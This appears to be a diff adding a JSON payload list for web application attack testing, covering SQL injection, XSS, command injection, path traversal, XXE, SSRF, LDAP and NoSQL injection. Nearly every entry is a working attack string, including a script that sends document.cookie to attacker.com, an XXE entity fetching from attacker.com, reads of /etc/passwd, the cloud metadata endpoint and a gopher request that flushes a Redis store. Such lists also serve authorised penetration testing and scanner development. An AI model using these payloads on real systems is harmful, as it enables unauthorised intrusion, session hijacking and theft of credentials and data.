@@ -1,0 +1,139 @@
+[
+    {
+        "category": "SQL Injection",
+        "description": "Classic authentication bypass",
+        "payloads": [
+            "' OR '1'='1",
+            "admin' --",
+            "admin' #",
+            "' OR '1'='1' --",
+            "' OR '1'='1' #",
+            "admin'/*",
+            "' OR 1=1--",
+            "' OR 1=1#",
+            "' OR 1=1/*",
+            "') OR ('1'='1",
+            "admin\" --",
+            "admin\" #"
+        ]
+    },
+    {
+        "category": "SQL Injection",
+        "description": "Union-based injection",
+        "payloads": [
+            "' UNION SELECT 1, 'admin', 'password' --",
+            "' UNION SELECT null, null, null --",
+            "1 UNION SELECT 1, version(), user()",
+            "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
+            "1 UNION SELECT username, password FROM users --",
+            "-1 UNION SELECT 1, group_concat(table_name), 3 from information_schema.tables where table_schema=database()--"
+        ]
+    },
+    {
+        "category": "SQL Injection",
+        "description": "Time-based blind injection",
+        "payloads": [
+            "1'; WAITFOR DELAY '0:0:5'--",
+            "1); WAITFOR DELAY '0:0:5'--",
+            "1'; SLEEP(5)--",
+            "1' AND SLEEP(5)--",
+            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+            "1' AND BENCHMARK(10000000,MD5(1))--",
+            "1; SELECT PG_SLEEP(5)--"
+        ]
+    },
+    {
+        "category": "XSS",
+        "description": "Reflected XSS script tags",
+        "payloads": [
+            "<script>alert('XSS')</script>",
+            "<script>alert(document.cookie)</script>",
+            "\"><script>alert(1)</script>",
+            "'><script>alert(1)</script>",
+            "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>"
+        ]
+    },
+    {
+        "category": "XSS",
+        "description": "Event handler injection",
+        "payloads": [
+            "<img src=x onerror=alert('XSS')>",
+            "<svg/onload=alert(1)>",
+            "<body onload=alert(1)>",
+            "<input onfocus=alert(1) autofocus>",
+            "<a href=\"javascript:alert(1)\">Click me</a>",
+            "<iframe src=\"javascript:alert(1)\"></iframe>"
+        ]
+    },
+    {
+        "category": "Command Injection",
+        "description": "OS command execution",
+        "payloads": [
+            "; ls -la",
+            "; cat /etc/passwd",
+            "| whoami",
+            "&& echo 'pwned'",
+            "`ping -c 1 127.0.0.1`",
+            "$(whoami)",
+            "|| dir",
+            "& net user",
+            "127.0.0.1; whoami"
+        ]
+    },
+    {
+        "category": "Path Traversal",
+        "description": "Directory traversal",
+        "payloads": [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\win.ini",
+            "....//....//....//etc/passwd",
+            "/var/www/html/../../../etc/passwd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "..%252f..%252f..%252fetc%252fpasswd"
+        ]
+    },
+    {
+        "category": "XXE",
+        "description": "XML External Entity",
+        "payloads": [
+            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil\">]><foo>&xxe;</foo>",
+            "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>"
+        ]
+    },
+    {
+        "category": "SSRF",
+        "description": "Server-Side Request Forgery",
+        "payloads": [
+            "http://localhost/admin",
+            "http://127.0.0.1:22",
+            "http://169.254.169.254/latest/meta-data/",
+            "dict://127.0.0.1:11211/",
+            "file:///etc/passwd",
+            "gopher://127.0.0.1:6379/_flushall"
+        ]
+    },
+    {
+        "category": "LDAP Injection",
+        "description": "LDAP query manipulation",
+        "payloads": [
+            "*",
+            ")(|(uid=*)",
+            "admin*)",
+            "*)(uid=*))(|(uid=*",
+            "user)(|(&("
+        ]
+    },
+    {
+        "category": "NoSQL Injection",
+        "description": "NoSQL query manipulation",
+        "payloads": [
+            "{\"$gt\": \"\"}",
+            "{\"$ne\": null}",
+            "{\"$where\": \"this.password == 'password'\"}",
+            "'; return true; var foo='",
+            "|| true",
+            "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}"
+        ]
+    }
+]
